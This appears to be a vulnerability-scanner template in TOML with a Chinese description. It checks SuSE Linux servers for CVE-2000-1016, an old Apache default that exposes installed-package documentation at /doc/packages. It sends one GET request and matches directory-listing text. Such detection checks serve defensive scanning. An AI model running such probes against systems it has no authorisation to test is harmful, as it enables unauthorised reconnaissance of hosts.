[info]
author = "AVE"
description = "检测目标 SuSE Linux 服务器是否因 Apache 默认配置将 /usr/doc 目录映射为 /doc/packages 的 Web 可访问路径，导致已安装软件包信息泄露"
id = "POC-AVE-2000-0742"
name = "SuSE Linux Apache 默认配置信息泄露 PoC"
severity = "medium"
tags = [
    "cve-2000-1016",
    "suse",
    "apache",
    "information-disclosure",
]
vuln_id = [
    "CVE-2000-1016",
    "AVE-2000-0742",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/doc/packages/"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Index of /doc/packages",
    "Directory Listing",
    "packages",
]
